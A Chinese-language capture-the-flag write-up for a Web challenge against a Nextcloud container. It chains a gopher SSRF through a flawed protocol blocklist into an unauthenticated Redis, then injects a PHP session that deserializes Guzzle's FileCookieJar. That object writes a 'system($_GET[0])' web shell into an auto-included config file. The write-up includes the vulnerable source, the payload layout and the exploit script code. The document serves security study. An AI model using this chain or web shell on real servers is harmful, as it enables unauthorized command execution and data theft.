# ezphp

> 赛后作品集版本：比赛提交用的 AI 对话记录、附件网盘链接与 zip MD5 留存在本地工作区，未随本文件公开。

## 题目信息

- 题目类型：Web
- 题目描述：`ezphp, how 2shell???(The container startup takes 1 minute.)`
- 附件或题目入口：容器 `https://eci-2zehmcpck7adwc4zp3ma.cloudeci1.ichunqiu.com/`
- 目标环境：Nextcloud 34.0.3.2，PHP 8.5.12，Apache 2.4.69 (Debian)，Redis 8.0.2

## 解题思路

入口 `/flag.php` 是自定义的 SSRF 端点：目标 host 被限制在 `127.0.0.1`/`::1`/`localhost`，但协议黑名单漏掉了 `gopher`，且 `curl_exec` 没有 `CURLOPT_RETURNTRANSFER`，内层响应会直接打印。用 gopher 可以访问本机 Redis，并自行控制内层 `User-Agent`。

`/flag.php` 从 `/opt/ctf/internal/flag.txt` 读到的 `flag{You_are_so_smart_8080}` 是诱饵，平台干净判错。真正的 flag 在根目录 `/flag`，需要命令执行。

Nextcloud 的 PHP 会话存在 Redis（`PHPREDIS_SESSION:<sid>`）。PHP 正常会话反序列化会加载类并实例化对象，而 Nextcloud 的 Composer autoloader 在 `initSession()` 之前注册。于是可以：

1. 通过 SSRF → Redis `EVAL` 写入一条 `PHPREDIS_SESSION:<sid>` 会话，值为 `pwn|` + 序列化对象；
2. 触发会话读取，反序列化 `GuzzleHttp\Cookie\FileCookieJar`；
3. `FileCookieJar::__destruct()` 会调用 `save()`，把 cookies 以 JSON 写入可控文件名；
4. 文件名选 Nextcloud 会自动 include 的 `config/*.config.php`，JSON 字符串里的 `<?php ... ?>` 会在 include 时执行，从而拿到 www-data 命令执行。

## 解题过程

### 1. 确认目标与 `/flag.php` SSRF

```text
$ curl -k -s https://eci-2zehmcpck7adwc4zp3ma.cloudeci1.ichunqiu.com/status.php
{"installed":true,"maintenance":false,"needsDbUpgrade":false,
"version":"34.0.3.2","versionstring":"34.0.3","edition":"",
"productname":"Nextcloud","extendedSupport":false}
```

`/flag.php` 的源码关键部分：

```php
$flag_file = '/opt/ctf/internal/flag.txt';
$remote = $_SERVER['REMOTE_ADDR'] ?? '';
if (in_array($remote, ['127.0.0.1','::1'], true)) {
    // 拒绝转发头；要求 User-Agent 以 qwb2026 开头
    echo trim((string)file_get_contents($flag_file)), PHP_EOL;
    exit;
}
highlight_file(__FILE__);
if (!isset($_REQUEST['url'])) exit;
$url = (string)$_REQUEST['url'];
if (preg_match('#(file|dict|ftp|tftp|sftp|ssh|smb|telnet|ldapi|phar|expect|zlib|glob|data|zip):/+#i', $url)) die('Hacker?');
if (strpos($url, '\\') !== false || substr_count($url, '@') > 1) die('Hacker?');
$host = strtolower(trim((string)parse_url($url, PHP_URL_HOST), '[]'));
if ($host !== '127.0.0.1' && $host !== '::1' && $host !== 'localhost') die('Hacker?');
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_USERAGENT, 'internal-preview/1.0');
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
curl_setopt($ch, CURLOPT_TIMEOUT, 5);
curl_exec($ch);
```

用 gopher 请求本机 `/flag.php`、伪造 UA 后确实读到了：

```text
flag{You_are_so_smart_8080}
```

但把这个值提交到平台后是**错误**的。继续检查发现 `/opt/ctf/internal/flag.txt` 只是诱饵，真正的 `/flag` 需要 RCE。

### 2. SSRF → Redis

gopher 可以直接访问 `127.0.0.1:6379`。Redis 未鉴权，`ACL LIST` 显示 default 用户 `+@all`，但 `CONFIG`/`KEYS`/`SCAN`/`RANDOMKEY` 等命令被 rename 掉了；`EVAL` 可用。

关键点是会话值里包含 PHP 序列化私有属性，带有 `\0`。gopher URL 里的 `%00` 会被 libcurl 拒绝，所以不能直接发 NUL。解决办法是用 Lua 在 Redis 端拼出二进制：

```lua
local p = [[payload part]] .. string.char(0) .. [[next part]] ...
redis.call('SET', KEYS[1], p, 'EX', 1800)
return #p
```

`/flag.php` 的 SSRF 会用外层请求的 host 校验，gopher URL 中的反斜杠在 PHP 侧是 `%5C`，不会触发 `strpos($url,'\\')`。EVAL 返回写入长度，GET 回读确认字节完全一致。

### 3. Nextcloud 会话注入

Nextcloud 的会话名是实例 ID，登录页响应会给出，例如：

```text
Set-Cookie: ocd7jpv81dop=68355a8fce1050da16de9580b7275e96; path=/; HttpOnly; SameSite=Lax
Set-Cookie: oc_sessionPassphrase=...; path=/; HttpOnly; SameSite=Lax
```

Redis 中对应的键是 `PHPREDIS_SESSION:<sid>`，值是 PHP `php` 序列化格式：

```text
encrypted_session_data|s:388:"...|...|...|3";
```

写入一个带对象的会话，例如：

```text
pwn|O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{...}
```

其中私有属性名需要完整命名空间，例如：

```text
\0GuzzleHttp\Cookie\FileCookieJar\0filename
\0GuzzleHttp\Cookie\FileCookieJar\0storeSessionCookies
\0GuzzleHttp\Cookie\CookieJar\0cookies
\0GuzzleHttp\Cookie\CookieJar\0strictMode
\0GuzzleHttp\Cookie\SetCookie\0data
\0GuzzleHttp\Cookie\SetCookie\0hostOnly
```

触发请求（`/index.php/login`，携带上述 session 与 passphrase cookie）后，回读会话键可以看到对象已经被反序列化并按 `GuzzleHttp\Cookie\FileCookieJar` 重新序列化，说明 autoload 和对象注入都成功。

### 4. `config/*.config.php` 自动加载 RCE

Nextcloud `lib/private/Config.php::readData()` 除了 `config/config.php`，还会：

```php
$extra = glob($this->configDir . '*.' . $this->configFileName);
...
include $file;
...
if (isset($CONFIG) && is_array($CONFIG)) {
    $this->cache = array_replace_recursive($this->cache, $CONFIG);
}
```

因此让 `FileCookieJar` 写 `/var/www/html/config/qwb.config.php`，JSON 里的 `Name` 字符串为：

```php
<?php $CONFIG=[]; if(isset($_GET[0])){ system($_GET[0]); @unlink(__FILE__); } ?>
```

文件内容形如（这是 FileCookieJar 的 JSON，PHP 会把 `<?php ... ?>` 之外当作文本输出）：

```text
[{"Name":"<?php $CONFIG=[]; ... ?>","Value":"x",...}]
```

下一次请求时 Config 会 include 该文件：

- `$CONFIG=[]` 保证 Nextcloud 继续合并配置；
- `$_GET[0]` 传入的命令通过 `system()` 执行；
- `@unlink(__FILE__)` 删除自身，避免持续影响实例。

先写文件，再请求：

```text
/status.php?0=echo+QWB_BEGIN_M0;+echo+QWB_END_M0
```

响应中出现 `QWB_BEGIN_M0`，确认配置目录就是 `/var/www/html/config`，RCE 成功。

### 5. 读取真 flag

执行 `cat /flag`，得到：

```text
flag{dde3a1fd-625d-460c-a76d-246cd3e9a0d5}
```

同时确认：

```text
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ ls -la /flag
-rw-r--r-- 1 root root 43 ... /flag
$ cat /opt/ctf/internal/flag.txt
flag{You_are_so_smart_8080}
```

`/flag` 是 root 所有但全局可读，因此 www-data 直接读取。完整命令输出保存在 `solve/success_evidence.txt`。

## 复现脚本

- `solve/gen_payload.py`：构造 FileCookieJar 的 PHP 序列化 payload，并把二进制转成 NUL-safe 的 Lua `EVAL` 脚本。
- `solve/redis_ctl.py`：通过 `/flag.php` 的 gopher SSRF 执行任意 Redis 命令。
- `solve/ezphp_cfg.py`：完整利用脚本；`probe` 模式尝试配置目录候选，`cmd` 模式在确认路径后执行命令。

`ezphp_cfg.py` 关键代码：

```python
CODE = "<?php $CONFIG=[]; if(isset($_GET[0])){ system($_GET[0]); @unlink(__FILE__); } ?>"

def inject(filename):
    payload = gen_payload.build(filename, "x", name=CODE)
    script = gen_payload.to_lua(payload)
    redis_ctl.redis(6379, "EVAL", script, "1", KEY, print_reply=False)

def trigger():
    get("/index.php/login")   # 携带 session + oc_sessionPassphrase cookie

def check(cmd):
    return get("/status.php?0=" + urllib.parse.quote_plus(cmd))
```

运行方式（脚本中的 `SESSION_NAME`/`SID`/`PASS` 来自目标 `/index.php/login` 的 `Set-Cookie`，换容器时需要更新）：

```bash
cd solve
python3 ezphp_cfg.py probe
python3 ezphp_cfg.py cmd 'id; ls -la /; cat /flag'
```

依赖：Python 3 标准库。

## Flag

`flag{dde3a1fd-625d-460c-a76d-246cd3e9a0d5}`

来源：`/flag.php` SSRF → Redis → Nextcloud PHP 会话注入 → Guzzle `FileCookieJar` 写 `/var/www/html/config/qwb.config.php` → Config 自动 include → www-data 命令执行 → 读取 `/flag`。

验证状态：已从目标 `/flag` 直接读取；平台提交通过（100 分，队友提交）。
